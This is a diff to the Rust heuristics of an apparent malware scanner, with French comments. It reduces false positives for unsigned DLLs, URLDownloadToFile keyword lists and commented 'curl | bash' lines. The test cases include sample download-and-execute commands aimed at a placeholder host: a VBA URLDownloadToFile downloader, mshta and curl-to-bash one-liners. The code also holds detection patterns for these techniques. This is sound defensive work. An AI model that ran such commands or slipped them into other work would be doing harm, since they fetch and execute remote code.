@@ -36,6 +36,9 @@ const ENTROPIE_PAQUETEUR: u16 = 7200;
 /// valeur est plutôt un autre paramètre) : 32 caractères font 24 octets, 12 caractères en UTF-16.
 const BASE64_MIN: usize = 32;
 
+/// IMAGE_FILE_DLL, drapeau Characteristics de l'en-tête COFF (Microsoft, « PE Format ») : le fichier est une DLL.
+const IMAGE_FILE_DLL: u16 = 0x2000;
+
 /// Où se trouve le fichier examiné : ce que l'heuristique du programme sans signature regarde.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub(crate) enum Lieu {
@@ -190,6 +193,13 @@ pub(crate) fn juger(p: &Partie, octets: &[u8], lieu: Lieu) -> Vec<Signe> {
 
 fn pe_non_signe(p: &Partie, lieu: Lieu) -> Option<String> {
     if lieu == Lieu::Ordinaire || p.type_ != Type::Pe {
+        return None;
+    }
+    // Une DLL ne se lance pas d'un double clic : sans signature, elle est ordinaire (Wine, Proton, greffons) ; c'est
+    // le programme qui la charge qui compte. Mesuré : des milliers de DLL de Proton levaient le signe à tort.
+    if let Details::Pe(s) = &p.details
+        && s.caracteristiques & IMAGE_FILE_DLL != 0
+    {
         return None;
     }
     p.faits.iter().find_map(|f| match f {
@@ -369,7 +379,9 @@ fn telechargement_windows(t: &str, seul: bool) -> Option<String> {
     if contient_mot(t, "mshta") && (t.contains("http://") || t.contains("https://")) {
         return Some("mshta http".to_string());
     }
-    if t.contains("urldownloadtofile") {
+    // L'appel n'existe qu'importé de urlmon.dll (« Declare … Lib "urlmon" » en VBA, DllImport en PowerShell) : son
+    // nom seul, dans une liste de mots-clés, n'est pas un appel (mesuré sur /usr/lib).
+    if t.contains("urldownloadtofile") && t.contains("urlmon") {
         return Some("urlmon, téléchargement vers un fichier".to_string());
     }
     if (t.contains("xmlhttp") || t.contains("winhttprequest")) && t.contains("adodb.stream") && t.contains("savetofile")
@@ -382,6 +394,22 @@ fn telechargement_windows(t: &str, seul: bool) -> Option<String> {
 /// curl ou wget dont la sortie va droit à un shell (« curl … | sh »), dans `t` en minuscules.
 fn telechargement_shell(t: &str) -> Option<String> {
     for ligne in t.lines() {
+        // Un commentaire du shell (une ligne qui commence par « # », ou ce qui suit « # » après une espace) ne
+        // s'exécute pas : une aide qui conseille « curl … | bash » n'est pas un téléchargeur (mesuré sur /usr/bin).
+        let ligne = ligne.trim_start();
+        if ligne.starts_with('#') {
+            continue;
+        }
+        let ligne = ligne
+            .match_indices('#')
+            .find(|(i, _)| {
+                ligne
+                    .get(..*i)
+                    .and_then(|a| a.chars().next_back())
+                    .is_some_and(char::is_whitespace)
+            })
+            .and_then(|(i, _)| ligne.get(..i))
+            .unwrap_or(ligne);
         for outil in ["curl", "wget"] {
             let Some(debut) = ligne
                 .match_indices(outil)
@@ -395,6 +423,11 @@ fn telechargement_shell(t: &str) -> Option<String> {
                 let apres = reste.get(i.saturating_add(1)..).unwrap_or("");
                 // « || » est un « ou » du shell, pas un tube.
                 if apres.starts_with('|') || reste.get(..i).is_some_and(|a| a.ends_with('|')) {
+                    continue;
+                }
+                // Sans rien entre l'outil et le tube (ni adresse, ni option, ni variable), « curl | bash » est une
+                // phrase d'aide, pas une commande : curl sans adresse ne télécharge rien (mesuré sur /usr/bin).
+                if reste.get(outil.len()..i).is_none_or(|a| a.trim().is_empty()) {
                     continue;
                 }
                 if let Some(s) = shell_du_tube(apres) {
@@ -459,6 +492,73 @@ mod tests {
         signes(octets, nom, lieu).into_iter().map(|(h, _)| h).collect()
     }
 
+    /// La mesure des faux positifs, sur de vrais fichiers sains de cet ordinateur, en lecture seule : les dossiers de
+    /// `VANGUARD_HEURISTIQUES_DOSSIERS` (séparés par « : »), jugés comme s'ils étaient dans le dossier des
+    /// téléchargements (le pire cas : le programme sans signature y compte). Seuls des nombres sortent, par
+    /// heuristique et par détail ; aucun chemin ni nom de fichier, rien de gardé. À la main :
+    /// `VANGUARD_HEURISTIQUES_DOSSIERS=/usr/bin:/usr/lib cargo test mesure_des_faux_positifs -- --ignored --nocapture`.
+    #[test]
+    #[ignore = "à la main, sur les dossiers donnés"]
+    fn mesure_des_faux_positifs() {
+        use std::collections::BTreeMap;
+        let Some(dossiers) = std::env::var_os("VANGUARD_HEURISTIQUES_DOSSIERS") else {
+            return crate::essais::saute("VANGUARD_HEURISTIQUES_DOSSIERS absent");
+        };
+        let mut pile: Vec<std::path::PathBuf> = std::env::split_paths(&dossiers).collect();
+        let (mut fichiers, mut signales) = (0u64, 0u64);
+        let mut par_heuristique: BTreeMap<&str, u64> = BTreeMap::new();
+        let mut par_detail: BTreeMap<(&str, String), u64> = BTreeMap::new();
+        let mut par_type: BTreeMap<String, u64> = BTreeMap::new();
+        while let Some(d) = pile.pop() {
+            let Ok(lecture) = std::fs::read_dir(&d) else { continue };
+            for e in lecture.flatten() {
+                let Ok(t) = e.file_type() else { continue };
+                if t.is_dir() {
+                    pile.push(e.path());
+                    continue;
+                }
+                if !t.is_file() {
+                    continue;
+                }
+                let mut vus: Vec<Signe> = Vec::new();
+                let mut type_ = String::new();
+                let lu = crate::analyse::analyser_fichier(&e.path(), &Bornes::default(), &mut |p, o| {
+                    if p.parent.is_none() {
+                        type_ = format!("{:?}", p.type_);
+                    }
+                    for s in juger(p, o, Lieu::Telechargements) {
+                        if !vus.iter().any(|v| v.heuristique == s.heuristique) {
+                            vus.push(s);
+                        }
+                    }
+                });
+                if lu.is_err() {
+                    continue;
+                }
+                fichiers += 1;
+                if vus.is_empty() {
+                    continue;
+                }
+                signales += 1;
+                *par_type.entry(type_).or_default() += 1;
+                for s in vus {
+                    *par_heuristique.entry(s.heuristique.code()).or_default() += 1;
+                    // Le détail dit ce qui a levé le signe (section, interpréteur, motif), coupé court.
+                    let detail: String = s.detail.chars().take(40).collect();
+                    *par_detail.entry((s.heuristique.code(), detail)).or_default() += 1;
+                }
+            }
+        }
+        eprintln!("{fichiers} fichiers lus, {signales} avec au moins un signe");
+        eprintln!("par heuristique : {par_heuristique:?}");
+        eprintln!("par type du fichier : {par_type:?}");
+        let mut details: Vec<_> = par_detail.into_iter().collect();
+        details.sort_by_key(|d| std::cmp::Reverse(d.1));
+        for ((h, d), n) in details.into_iter().take(40) {
+            eprintln!("  {n:>6}  {h}  {d}");
+        }
+    }
+
     #[test]
     fn codes_stables_et_distincts() {
         let codes: Vec<&str> = Heuristique::TOUTES.iter().map(|h| h.code()).collect();
@@ -484,6 +584,10 @@ mod tests {
         // Signé (une table de certificats PKCS#7 annoncée) : rien, même téléchargé.
         let signe = corpus::pe(&[(".text", corpus::RX, &[0x90; 512])], true);
         assert_eq!(heuristiques(&signe, "outil.exe", Lieu::Telechargements), []);
+        // Une DLL (drapeau IMAGE_FILE_DLL, Characteristics au décalage 0x84 + 18) : rien, elle ne se lance pas seule.
+        let mut dll = pe.clone();
+        dll[0x84 + 18..0x84 + 20].copy_from_slice(&(0x0022u16 | IMAGE_FILE_DLL).to_le_bytes());
+        assert_eq!(heuristiques(&dll, "outil.dll", Lieu::Telechargements), []);
     }
 
     #[test]
@@ -623,6 +727,11 @@ mod tests {
             ),
             ("mshta https://exemple.invalid/a.hta", "a.bat", "mshta http"),
             (
+                "Private Declare Function URLDownloadToFile Lib \"urlmon\" (ByVal a As Long) As Long\r\nSub x()\r\nURLDownloadToFile 0, \"http://exemple.invalid/a\", \"a.exe\", 0, 0\r\nEnd Sub\r\n",
+                "a.vbs",
+                "urlmon, téléchargement vers un fichier",
+            ),
+            (
                 "Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\nSet s = CreateObject(\"ADODB.Stream\")\r\ns.SaveToFile \"a.exe\"\r\n",
                 "a.vbs",
                 "XMLHTTP + ADODB.Stream",
@@ -659,7 +768,24 @@ mod tests {
             ("#!/bin/sh\ncurl -fsS https://exemple.invalid/ || shasum a\n", "a.sh"),
             ("#!/bin/sh\necho 'libcurl | shell' > /dev/null\n", "a.sh"),
             ("#!/bin/sh\ncurl -fsS https://exemple.invalid/l | grep sh\n", "a.sh"),
+            (
+                "#!/bin/sh\n# ou bien : curl -fsSL https://exemple.invalid/i | bash\n",
+                "a.sh",
+            ),
+            (
+                "#!/bin/sh\ncat <<'AIDE'\nOu lancé directement par curl | bash.\nAIDE\n",
+                "a.sh",
+            ),
+            (
+                "#!/bin/sh\necho x # curl -fsSL https://exemple.invalid/i | bash\n",
+                "a.sh",
+            ),
             ("#!/usr/bin/env python3\nimport os\nos.system('curl x | sh')\n", "a.py"),
+            // Le nom de l'appel dans une liste de mots-clés (un colorieur de code), sans import de urlmon.
+            (
+                "Dim mots\r\nmots = Array(\"URLDownloadToFile\", \"ShellExecute\", \"Run\")\r\n",
+                "mots.vbs",
+            ),
         ] {
             assert!(
                 !heuristiques(texte.as_bytes(), nom, Lieu::Ordinaire).contains(&Heuristique::Telechargeur),
